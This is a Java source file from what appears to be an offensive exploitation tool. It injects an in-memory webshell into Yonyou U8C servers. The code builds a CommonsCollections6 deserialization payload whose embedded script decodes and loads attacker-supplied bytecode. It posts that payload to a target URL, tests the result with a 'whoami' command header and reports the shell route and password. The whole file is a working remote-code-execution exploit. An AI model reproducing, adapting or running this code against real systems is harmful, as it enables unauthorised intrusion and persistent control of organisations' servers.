package Memshell;

import core.MemShellInterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import org.apache.commons.math3.analysis.function.Exp;
import utils.HttpTools;
import utils.Response;
import yso.Serializer;
import yso.payloads.CommonsCollections6NC;
import yso.payloads.ObjectPayload;
import yso.payloads.util.Methods;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.zip.GZIPOutputStream;

public class yonyouU8C_Inject_Memshell implements MemShellInterface {
    private static byte[] bytes;



    @Override
    public Boolean inject(String url,String interF,String type,int dirtyN,String[] array, TextArea textArea_memshell) {
        return yyInject(url,interF,type,dirtyN,array,textArea_memshell);
    }

    @Override
    public Boolean injectPrint(String type,String interFace,String PrintType, int dirtyN, String[] array, TextArea textArea_memshell) {
        return yyInjectPrint(type,interFace,PrintType, dirtyN, array, textArea_memshell);
    }

    private Boolean yyInjectPrint(String type,String interFace,String PrintType,int dirtyN,String[] array, TextArea textArea){
        System.setProperty("org.apache.commons.collections.enableUnsafeSerialization","true");
        try {
            final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass("CommonsCollections6");
            ObjectPayload payload = payloadClass.newInstance();
            String command;
            String define;
            if(array.length==2){
                String prefix = "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();try{classLoader.loadClass('$$$$').newInstance();}catch (e){var clsString = classLoader.loadClass('java.lang.String');var bytecodeBase64 = '".replace("$$$$",array[1]);
                String suffix = "';var bytecode;try{var clsBase64 = classLoader.loadClass('java.util.Base64');var clsDecoder = classLoader.loadClass('java.util.Base64$Decoder');var decoder = clsBase64.getMethod('getDecoder').invoke(base64Clz);bytecode = clsDecoder.getMethod('decode', clsString).invoke(decoder, bytecodeBase64);} catch (ee) {try {var datatypeConverterClz = classLoader.loadClass('javax.xml.bind.DatatypeConverter');bytecode = datatypeConverterClz.getMethod('parseBase64Binary', clsString).invoke(datatypeConverterClz, bytecodeBase64);} catch (eee) {var clazz1 = classLoader.loadClass('sun.misc.BASE64Decoder');bytecode = clazz1.newInstance().decodeBuffer(bytecodeBase64);}}var clsClassLoader = classLoader.loadClass('java.lang.ClassLoader');var clsByteArray = (new java.lang.String('a').getBytes().getClass());var clsInt = java.lang.Integer.TYPE;var defineClass = clsClassLoader.getDeclaredMethod('defineClass', [clsByteArray, clsInt, clsInt]);defineClass.setAccessible(true);var clazz = defineClass.invoke(classLoader,bytecode,new java.lang.Integer(0),new java.lang.Integer(bytecode.length));clazz.newInstance();}";
                define = java.util.Base64.getEncoder().encodeToString((prefix + array[0] + suffix).getBytes());
            }else{
                define = array[0];
            }

            command = "script_base64:"+define;
            Object object = payload.getObject(command);
            byte[] data = Serializer.serialize(object);
            if(Allyyu8cInterface.getCryptType(interFace)){
                data = Methods.gzipEncompress(data);
            }
            ObjectPayload.Utils.releasePayload(payload, object);
            bytes = data;

            String print = AllMemPrint.getMemPrint("用友U8C",bytes, PrintType);
            if(array.length == 4 ){
                if(array[2].contains("R4gCmd")){
                    Platform.runLater(() -> {
                        textArea.appendText("\n"+type+"内存马payload("+PrintType+")生成成功！\n"+"请求头: "+array[2]+"\n密码: "+array[3]+"\n\n"+print);
                    });
                }else{
                    Platform.runLater(() -> {
                        textArea.appendText("\n"+type+"内存马payload("+PrintType+")生成成功！\n"+"路由: /R4gU8C\n请求头: "+array[2]+"\n密码: "+array[3]+"\n\n"+print);
                    });
                }
            }else{
                Platform.runLater(() -> {
                    textArea.appendText("\n自定义class字节payload("+PrintType+")生成成功！\n\n\n"+print);

                });
            }
            return true;
        }catch (Exception e){
            return false;
        }
    }

    private boolean yyInject(String url,String interFace,String type,int dirtyN,String[] array,TextArea textArea){
        System.setProperty("org.apache.commons.collections.enableUnsafeSerialization","true");
        try {
            final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass("CommonsCollections6");
            ObjectPayload payload = payloadClass.newInstance();
            String command;
            String define;
            if(array[2] == "define"){
                String prefix = "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();try{classLoader.loadClass('$$$$').newInstance();}catch (e){var clsString = classLoader.loadClass('java.lang.String');var bytecodeBase64 = '".replace("$$$$",array[1]);
                String suffix = "';var bytecode;try{var clsBase64 = classLoader.loadClass('java.util.Base64');var clsDecoder = classLoader.loadClass('java.util.Base64$Decoder');var decoder = clsBase64.getMethod('getDecoder').invoke(base64Clz);bytecode = clsDecoder.getMethod('decode', clsString).invoke(decoder, bytecodeBase64);} catch (ee) {try {var datatypeConverterClz = classLoader.loadClass('javax.xml.bind.DatatypeConverter');bytecode = datatypeConverterClz.getMethod('parseBase64Binary', clsString).invoke(datatypeConverterClz, bytecodeBase64);} catch (eee) {var clazz1 = classLoader.loadClass('sun.misc.BASE64Decoder');bytecode = clazz1.newInstance().decodeBuffer(bytecodeBase64);}}var clsClassLoader = classLoader.loadClass('java.lang.ClassLoader');var clsByteArray = (new java.lang.String('a').getBytes().getClass());var clsInt = java.lang.Integer.TYPE;var defineClass = clsClassLoader.getDeclaredMethod('defineClass', [clsByteArray, clsInt, clsInt]);defineClass.setAccessible(true);var clazz = defineClass.invoke(classLoader,bytecode,new java.lang.Integer(0),new java.lang.Integer(bytecode.length));clazz.newInstance();}";
                define = java.util.Base64.getEncoder().encodeToString((prefix + array[0] + suffix).getBytes());

            }else{
                define = array[0];
            }

            command = "script_base64:"+define;
            Object object = payload.getObject(command);
            byte[] data = Serializer.serialize(object);
            if(Allyyu8cInterface.getCryptType(interFace)){
                data = Methods.gzipEncompress(data);
            }

            ObjectPayload.Utils.releasePayload(payload, object);
            HashMap head = new HashMap();
            bytes = data;

            if (array[2].contains("R4gCmd")) {
                head.put("R4gCmd", "whoami");
            }

            Response res = HttpTools.post_byte(url+interFace,bytes,head,"gbk");
            String result = res.getText();
            if(res.getCode()!=404) {
                if (array.length == 4 && array[2]!="define") {
                    if(array[2].contains("R4gCmd")){
                        if(!result.isEmpty()||result!=null){
                            Platform.runLater(() -> {
                                textArea.appendText("\n" + type + " 内存马注入成功！\nurl: " + url +interFace+ "\n请求头: " + array[2] + "\n密码: " + array[3]+"\n回显: "+result.split("\n")[0]);
                            });
                        }else{
                            Platform.runLater(() -> {
                                textArea.appendText("\n" + type + " 内存马注入成功！\nurl: " + url +interFace+ "\n请求头: " + array[2] + "\n密码: " + array[3]+"\n回显失败");
                            });
                        }

                    }else{
                        Platform.runLater(() -> {
                            textArea.appendText("\n" + type + " 内存马注入完成，请自行连接判断！\nurl: " + url + "/R4gU8C\n请求头: " + array[2] + "\n密码: " + array[3]);
                        });
                    }

                } else {
                    Platform.runLater(() -> {
                        textArea.appendText("\n" + " 自定义classbyte注入成功！");
                    });
                }
                return true;
            }else{
                Platform.runLater(() -> {
                    textArea.appendText("\n"+type+" 注入失败！");
                });
                return false;
            }

        }catch (Exception e){
            Platform.runLater(() -> {
                textArea.appendText("\n"+type+" 注入失败！");
            });
            return false;
        }
    }
}
